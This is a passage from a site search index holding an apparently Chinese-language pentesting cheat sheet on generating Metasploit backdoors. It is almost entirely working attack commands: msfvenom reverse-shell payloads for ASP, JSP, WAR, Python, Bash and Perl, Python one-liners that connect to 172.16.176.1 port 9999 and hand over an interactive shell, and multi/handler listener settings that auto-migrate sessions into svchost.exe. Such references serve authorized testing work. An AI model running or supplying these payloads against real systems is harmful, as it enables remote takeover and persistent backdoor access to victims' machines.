string">'&lt;?php '</span> <span class="token operator">|</span> <span class="token function">tr</span> -d <span class="token string">'\n'</span> <span class="token operator">></span> shell.php <span class="token operator">&amp;&amp;</span> pbpaste <span class="token operator">>></span> shell.php</code></pre><h3 id="asp"><a href="#asp" class="headerlink" title="asp"></a>asp</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f asp <span class="token operator">></span> shell.asp</code></pre><h3 id="jsp"><a href="#jsp" class="headerlink" title="jsp"></a>jsp</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw <span class="token operator">></span> shell.jsp</code></pre><h3 id="war"><a href="#war" class="headerlink" title="war"></a>war</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f war <span class="token operator">></span> shell.war</code></pre><h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p cmd/unix/reverse_python LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw <span class="token operator">></span> shell.pymsfvenom -a python -p python/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw <span class="token operator">></span> shell.py</code></pre><p>正向shell</p><pre class=" language-python"><code class="language-python">python<span class="token operator">/</span>python3 <span class="token operator">-</span>c <span class="token string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.176.1",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</span>python<span class="token operator">/</span>python3 <span class="token operator">-</span>c <span class="token string">"exec(\"import socket, subprocess;s = socket.socket();s.connect(('172.16.176.1',9999))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"</span></code></pre><h3 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p cmd/unix/reverse_bash LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw <span class="token operator">></span> shell.sh</code></pre><h3 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p cmd/unix/reverse_perl LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw <span class="token operator">></span> shell.pl</code></pre><h1 id="MSF监听"><a href="#MSF监听" class="headerlink" title="MSF监听"></a>MSF监听</h1><pre class=" language-bash"><code class="language-bash">use exploit/multi/handler<span class="token keyword">set</span> PAYLOAD <span class="token operator">&lt;</span>Payload name<span class="token operator">></span><span class="token keyword">set</span> RHOST <span class="token operator">&lt;</span>RHOST value<span class="token operator">></span><span class="token keyword">set</span> RPORT <span class="token operator">&lt;</span>RPORT value<span class="token operator">></span><span class="token keyword">set</span> LHOST <span class="token operator">&lt;</span>LHOST value<span class="token operator">></span><span class="token keyword">set</span> LPORT <span class="token operator">&lt;</span>LPORT value<span class="token operator">></span><span class="token keyword">set</span> ExitOnSession <span class="token boolean">false</span>exploit -j -z</code></pre><p>其他设置</p><p><code>AutoRunScript</code>：自动执行脚本<br>如：自动执行<code>post/windows/manage/migrate</code> 模块注入其他进程</p><pre class=" language-bash"><code class="language-bash"><span class="token keyword">set</span> AutoRunScript post/windows/manage/migrate</code></pre><p>自动注入进程</p><pre class=" language-bash"><code class="language-bash"><span class="token keyword">set</span> prependmigrate <span class="token boolean">true</span><span class="token keyword">set</span> prependmigrateProc svchost.exe</code></pre><p>辅助配置</p><pre class=" language-bash"><code class="language-bash"><span class="token keyword">set</span> exitonsession <span class="token boolean">false</span> //可以让建立监听的端口继续保持侦听，可以接受多个session<span class="token keyword">set</span> stagerverifysslcert <span class="token boolean">false</span> //防止获取shell的时候出现的SSL_accept错误</code></pre>]]></content>
      
      
      <categories>
          
          <category> 攻防渗透 </category>
          
          <category> 神兵利器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> metasploit </tag>
            
            <tag> RAT </tag>
            
            <tag> 木马后门 </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
